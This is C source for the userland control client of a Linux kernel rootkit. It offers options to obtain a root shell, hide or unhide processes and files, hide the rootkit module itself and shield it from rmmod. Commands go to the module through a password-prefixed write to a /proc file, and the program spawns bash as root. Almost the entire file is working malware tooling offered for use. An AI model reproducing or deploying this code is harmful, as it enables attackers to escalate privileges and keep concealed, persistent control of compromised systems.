/*
 * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>

#include "config.h"

void print_help(char **argv)
{
    printf(
        "Usage: %s [OPTION]...\n"
        "\n"
        "Options:\n"
        "  --root-shell            Grants you root shell access.\n"
        "  --hide-pid=PID          Hides the specified PID.\n"
        "  --unhide-pid=PID        Unhides the specified PID.\n"
        "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
        "                          Must be a filename without any path.\n"
        "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
        "  --hide                  Hides the rootkit LKM.\n"
        "  --unhide                Unhides the rootkit LKM.\n"
        "  --help                  Print this help message.\n"
        "  --protect               Protects the rootkit from rmmod.\n"
        "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
}

void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
                                   int *unhide_pid, char **pid, int *hide_file,
                                   int *unhide_file, char **file, int *hide,
                                   int *unhide, int *protect, int *unprotect)
{
    if (argc < 2) {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        print_help(argv);
        exit(1);
    }

    opterr = 0;

    static struct option long_options[] = {
        {"root-shell",  no_argument,       0, 'a'},
        {"hide-pid",    required_argument, 0, 'b'},
        {"unhide-pid",  required_argument, 0, 'c'},
        {"hide-file",   required_argument, 0, 'd'},
        {"unhide-file", required_argument, 0, 'e'},
        {"hide",        no_argument,       0, 'f'},
        {"unhide",      no_argument,       0, 'g'},
        {"help",        no_argument,       0, 'h'},
        {"protect",     no_argument,       0, 'i'},
        {"unprotect",   no_argument,       0, 'j'},
        {0,             0,                 0,  0 }
    };

    *root = 0;
    *hide_pid = 0;
    *unhide_pid = 0;
    *pid = NULL;
    *hide_file = 0;
    *unhide_file = 0;
    *file = NULL;
    *hide = 0;
    *unhide = 0;
    *protect = 0;
    *unprotect = 0;

    int opt;

    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1) {

        switch (opt) {

            case 'a':
                *root = 1;
                break;

            case 'b':
                *hide_pid = 1;
                *pid = optarg;
                break;

            case 'c':
                *unhide_pid = 1;
                *pid = optarg;
                break;

            case 'd':
                *hide_file = 1;
                *file = optarg;
                break;

            case 'e':
                *unhide_file = 1;
                *file = optarg;
                break;

            case 'f':
                *hide = 1;
                break;

            case 'g':
                *unhide = 1;
                break;

            case 'h':
                print_help(argv);
                exit(0);

            case 'i':
                *protect = 1;
                break;

            case 'j':
                *unprotect = 1;
                break;

            case '?':
                fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);

            case ':':
                fprintf(stderr, "Error: No argument provided for option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);
        }
    }

    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
            + *unhide + *protect + *unprotect) != 1) {
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        print_help(argv);
        exit(1);
    }
}

void write_buffer(char **dest_ptr, char *src, size_t size)
{
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}

int main(int argc, char **argv)
{
    int root;
    int hide_pid;
    int unhide_pid;
    char *pid;
    int hide_file;
    int unhide_file;
    char *file;
    int hide;
    int unhide;
    int protect;
    int unprotect;

    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
                                  &hide_file, &unhide_file, &file, &hide, &unhide,
                                  &protect, &unprotect);

    size_t buf_size = 0;

    buf_size += sizeof(CFG_PASS);

    if (root) {
        buf_size += sizeof(CFG_ROOT);
    } else if (hide_pid) {
        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
    } else if (unhide_pid) {
        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
    } else if (hide_file) {
        buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
    } else if (unhide_file) {
        buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(file);
    } else if (hide) {
        buf_size += sizeof(CFG_HIDE);
    } else if (unhide) {
        buf_size += sizeof(CFG_UNHIDE);
    } else if (protect) {
        buf_size += sizeof(CFG_PROTECT);
    } else if (unprotect) {
        buf_size += sizeof(CFG_UNPROTECT);
    }

    buf_size += 1; // for null terminator

    char *buf = malloc(buf_size);
    buf[buf_size - 1] = 0;

    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));

    if (root) {
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide_pid) {
        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (unhide_pid) {
        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (hide_file) {
        write_buffer(&buf_ptr, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (unhide_file) {
        write_buffer(&buf_ptr, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (hide) {
        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
    } else if (unhide) {
        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
    } else if (protect) {
        write_buffer(&buf_ptr, CFG_PROTECT, sizeof(CFG_PROTECT));
    } else if (unprotect) {
        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
    }

    int fd = open("/proc/" CFG_PROC_FILE, O_RDONLY);

    if (fd < 1) {
        int fd = open("/proc/" CFG_PROC_FILE, O_WRONLY);

        if (fd < 1) {
            fprintf(stderr, "Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
            return 1;
        }

        write(fd, buf, buf_size);
    } else {
        read(fd, buf, buf_size);
    }

    close(fd);
    free(buf);

    if (root) {
        execl("/bin/bash", "bash", NULL);
    }

    return 0;
}
